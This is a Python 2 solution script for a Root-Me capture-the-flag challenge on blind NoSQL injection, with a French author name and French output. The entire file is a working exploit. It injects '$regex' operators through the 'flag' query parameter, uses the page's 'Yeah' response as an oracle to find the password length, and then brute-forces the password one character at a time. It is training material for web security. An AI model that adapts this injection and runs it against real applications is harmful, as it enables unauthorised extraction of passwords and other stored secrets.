#!/usr/bin/env python2
# Bezet-Torres Mattéo
from __future__ import print_function
import requests
import re
import sys

page = "http://challenge01.root-me.org/web-serveur/ch48/index.php"

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}


taille=1
while 1:
     forge=".{"+str(taille)+"}";
     req={'chall_name':'nosqlblind', 'flag[$regex]':forge}
     resultat=requests.get(page+'?chall_name=nosqlblind&flag[$regex]='+forge).content
     print(req)
     if resultat.find(b'Yeah')==-1 :
          break
     taille+=1

taille-=1
print("[+] Le password fait "+str(taille)+" caracteres")
passwd=""
char=32

length=0

while length!=taille:
     forge=passwd+re.escape(str(chr(char)))+'.{'+str(taille-len(passwd)-1)+'}';
     req={'chall_name':'nosqlblind', 'flag[$regex]':forge}
     resultat=requests.get(page+'?chall_name=nosqlblind&flag[$regex]='+forge).content
     print(passwd+str(chr(char))+'   ', end='\r')
     sys.stdout.flush()
     if resultat.find(b'Yeah')!=-1 :
          passwd+=str(chr(char))
          char=32
          length+=1

     char+=1
print("[+] Le password est: "+str(passwd))
